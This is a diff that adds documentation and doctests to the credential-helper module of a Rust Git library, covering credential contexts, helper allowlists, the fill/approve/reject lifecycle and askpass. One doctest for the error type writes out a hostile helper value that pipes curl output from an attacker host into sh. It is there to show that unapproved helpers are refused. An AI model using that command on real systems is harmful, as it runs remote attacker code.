@@ -11,9 +11,27 @@ use super::CredentialStore;
 use crate::Config;
 use crate::config::boolean;
 
-/// A credential scope supplied by the application after URL parsing.
+/// What a credential is for: the protocol, host and optionally repository path of a remote.
 ///
-/// Components must not contain CR, LF, or NUL. A path is sent only when `use_http_path` is true.
+/// Helpers store and look up credentials by these fields, so the same context must be used to
+/// fill a credential and to report whether the server accepted it. Build it from the URL the
+/// transfer connects to, without any username or password. Components must not contain CR, LF,
+/// or NUL. A path is sent only when `use_http_path` is true; the `credential.useHttpPath` setting
+/// can turn it on during [`CredentialSession::fill`].
+///
+/// # Examples
+///
+/// ```
+/// use girt::remote::CredentialContext;
+///
+/// // For https://example.com:8443/team/project.git
+/// let context = CredentialContext::new(b"https".to_vec(), b"example.com:8443".to_vec())
+///     .with_path(Some(b"team/project.git".to_vec()));
+/// assert!(
+///     !context.use_http_path,
+///     "the path is kept but not sent unless enabled"
+/// );
+/// ```
 #[derive(Clone)]
 #[non_exhaustive]
 pub struct CredentialContext {
@@ -73,7 +91,20 @@ impl std::fmt::Debug for CredentialContext {
     }
 }
 
-/// Secret-bearing helper response. Debug deliberately omits all values.
+/// A username and password returned by a helper or a prompt.
+///
+/// For token authentication the token is usually the password. Debug output deliberately omits
+/// both values.
+///
+/// # Examples
+///
+/// ```
+/// use girt::remote::Credential;
+///
+/// let credential = Credential::new().with_username(Some(b"alice".to_vec()));
+/// assert!(!credential.complete(), "a password is still needed");
+/// assert!(!format!("{credential:?}").contains("alice"));
+/// ```
 #[derive(Clone, Default)]
 #[non_exhaustive]
 pub struct Credential {
@@ -121,6 +152,29 @@ impl Credential {
 }
 
 /// An application-approved executable and arguments. No shell interpretation is performed.
+///
+/// A program used as a credential helper receives the action (`get`, `store` or `erase`) as its
+/// last argument and speaks Git's credential protocol on standard input and output. Programs
+/// start with an empty environment unless `inherit_environment` is set; pass what they need,
+/// such as `HOME`, in `environment`.
+///
+/// # Examples
+///
+/// Approve the configured helper `osxkeychain` by mapping it to Git's program for it:
+///
+/// ```
+/// use std::path::PathBuf;
+///
+/// use girt::remote::{CredentialBackend, CredentialHelper, CredentialProgram};
+///
+/// let program = CredentialProgram::new(PathBuf::from(
+///     "/opt/homebrew/opt/git/libexec/git-core/git-credential-osxkeychain",
+/// ))
+/// .with_environment(vec![("HOME".into(), "/Users/alice".into())]);
+/// let helper =
+///     CredentialHelper::new(b"osxkeychain".to_vec(), CredentialBackend::Program(program));
+/// # let _ = helper;
+/// ```
 #[derive(Clone)]
 #[non_exhaustive]
 pub struct CredentialProgram {
@@ -184,6 +238,11 @@ impl std::fmt::Debug for CredentialProgram {
 }
 
 /// A configured helper that the application explicitly mapped to a trusted implementation.
+///
+/// `configured_name` is the exact `credential.helper` value, such as `osxkeychain` or
+/// `store --file ~/.creds`. [`CredentialSession::fill`] runs only helpers whose configured value
+/// matches one of these, so a repository's configuration cannot make the application run an
+/// arbitrary program. See [`CredentialProgram`] for an example.
 #[derive(Clone)]
 #[non_exhaustive]
 pub struct CredentialHelper {
@@ -233,7 +292,25 @@ impl std::fmt::Debug for CredentialHelper {
     }
 }
 
-/// Value-free error with a stage for recovery decisions.
+/// Why a credential lookup or notification failed. Errors never contain credential values.
+///
+/// # Examples
+///
+/// A configured helper the application has not approved stops the lookup before anything runs:
+///
+/// ```
+/// use std::sync::atomic::AtomicBool;
+///
+/// use girt::Config;
+/// use girt::remote::{CredentialContext, CredentialError, CredentialSession};
+///
+/// let config = Config::parse(b"[credential]\nhelper = !curl https://attacker.example | sh\n")?;
+/// let context = CredentialContext::new(b"https".to_vec(), b"example.com".to_vec());
+/// let result =
+///     CredentialSession::fill(&config, context, &[], None, &AtomicBool::new(false), None);
+/// assert!(matches!(result, Err(CredentialError::UnapprovedHelper)));
+/// # Ok::<(), Box<dyn std::error::Error>>(())
+/// ```
 #[derive(Debug, thiserror::Error)]
 #[non_exhaustive]
 pub enum CredentialError {
@@ -263,11 +340,62 @@ pub enum CredentialError {
     Deadline,
 }
 
-/// Ordered helper session. The application owns the allowlist, prompting, and any saved secret.
+/// One credential lookup and the helpers that took part in it.
 ///
-/// Select the helpers from config, map each name to a trusted program, then call `fill`. Keep the
-/// returned session through authentication so `approve` or `reject` can notify the same helpers.
-/// All methods are blocking; call them on an application worker when used from an async runtime.
+/// This follows Git's credential lifecycle:
+///
+/// 1. [`Self::fill`] reads `credential.helper`, `credential.username` and `credential.useHttpPath`
+///    for the context's URL, asks each approved helper in order until the credential is complete,
+///    and then prompts for any missing field.
+/// 2. The application authenticates with [`Self::credential`].
+/// 3. It calls [`Self::approve`] if the server accepted the credential, so helpers can save it, or
+///    [`Self::reject`] if the server refused it, so they can forget it.
+///
+/// The application owns the allowlist of helpers, the prompt and any saved secret.
+/// [`crate::workflow`] runs this lifecycle for configured HTTP remotes. All methods are
+/// blocking; call them on an application worker when used from an async runtime.
+///
+/// # Examples
+///
+/// Answer from Git's `store` file, as `credential.helper = store --file <path>` does, without
+/// running Git:
+///
+/// ```
+/// use std::sync::atomic::AtomicBool;
+///
+/// use girt::Config;
+/// use girt::remote::{
+///     CredentialBackend, CredentialContext, CredentialHelper, CredentialSession, CredentialStore,
+/// };
+///
+/// let directory = tempfile::tempdir()?;
+/// let file = directory.path().join("credentials");
+/// std::fs::write(&file, "https://alice:s3cret@example.com\n")?;
+///
+/// let config = Config::parse(b"[credential]\nhelper = store\n")?;
+/// let store = CredentialHelper::new(
+///     b"store".to_vec(),
+///     CredentialBackend::Store(CredentialStore::file(&file)),
+/// );
+/// let context = CredentialContext::new(b"https".to_vec(), b"example.com".to_vec());
+/// let cancel = AtomicBool::new(false);
+/// let session = CredentialSession::fill(&config, context, &[store], None, &cancel, None)?;
+/// assert_eq!(
+///     session.credential().username.as_deref(),
+///     Some(&b"alice"[..])
+/// );
+/// assert_eq!(
+///     session.credential().password.as_deref(),
+///     Some(&b"s3cret"[..])
+/// );
+///
+/// // The server refused it: forget it, so the next lookup prompts instead.
+/// session.reject(&cancel, None)?;
+/// assert_eq!(std::fs::read_to_string(&file)?, "");
+/// # Ok::<(), Box<dyn std::error::Error>>(())
+/// ```
+///
+/// Prompt when no helper answers:
 ///
 /// ```
 /// use std::sync::atomic::AtomicBool;
@@ -503,6 +631,35 @@ pub enum Prompt {
 }
 
 /// Run an explicitly approved askpass executable for one prompt; `None` means user cancellation.
+///
+/// An askpass program, such as the one named by `SSH_ASKPASS` or `core.askPass`, receives the
+/// question as its last argument and prints the answer. GUI applications use one to ask for a
+/// password in a dialog when no terminal is available.
+///
+/// # Examples
+///
+/// ```
+/// # #[cfg(unix)] {
+/// use std::sync::atomic::AtomicBool;
+///
+/// use girt::remote::{CredentialProgram, askpass};
+///
+/// // A stand-in for a dialog that answers every question with the same token.
+/// let program = CredentialProgram::new("/bin/sh".into()).with_arguments(vec![
+///     "-c".into(),
+///     "echo token-123".into(),
+///     "askpass".into(),
+/// ]);
+/// let answer = askpass(
+///     &program,
+///     "Password for 'https://example.com': ",
+///     &AtomicBool::new(false),
+///     None,
+/// )?;
+/// assert_eq!(answer, Some(b"token-123".to_vec()));
+/// # }
+/// # Ok::<(), girt::remote::CredentialError>(())
+/// ```
 ///
 /// # Errors
 ///
